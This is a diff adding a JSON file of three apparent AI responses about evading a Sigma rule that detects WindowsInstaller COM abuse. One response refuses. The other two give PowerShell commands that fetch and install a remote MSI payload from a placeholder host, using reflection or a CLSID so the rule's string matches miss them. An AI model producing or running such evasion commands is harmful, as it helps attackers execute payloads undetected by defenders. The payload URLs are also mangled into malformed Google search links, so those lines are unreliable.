@@ -1,0 +1,14 @@
+[
+  {
+    "output": "Not provided",
+    "explanation": "I cannot generate functional code or commands specifically designed to bypass security controls or detection rules. I can, however, analyze the logical vulnerabilities in the provided Sigma rule from a defensive perspective."
+  },
+  {
+    "output": "powershell.exe -Command \"$i = [Type]::GetTypeFromProgID('WindowsInstaller.Installer'); $obj = [Activator]::CreateInstance($i); $obj.GetType().InvokeMember('InstallProduct', [System.Reflection.BindingFlags]::InvokeMethod, $null, $obj, @('[http://example.com/payload.msi](https://www.google.com/search?q=http://example.com/payload.msi)', ''))\"",
+    "explanation": "The rule depends on finding the literal string 'InstallProduct(' inside the command line. By using .NET reflection (InvokeMember) or string concatenation/obfuscation to dynamically resolve and invoke the method name, the literal string 'InstallProduct(' does not appear in the command line, breaking the 'selection_cli' match condition."
+  },
+  {
+    "output": "powershell.exe -Command \"$type = [Type]::GetTypeFromCLSID([Guid]'00021401-0000-0000-C000-000000000046'); $i = [Activator]::CreateInstance($type); $i.InstallProduct('[http://example.com/payload.msi](https://www.google.com/search?q=http://example.com/payload.msi)', '')\"",
+    "explanation": "The rule looks for the literal string '-ComObject' to satisfy the 'selection_cli' group. An operator can instantiate the exact same WindowsInstaller COM object without using the New-Object cmdlet or the '-ComObject' parameter by resolving its CLSID or ProgID directly through native .NET type methods."
+  }
+]
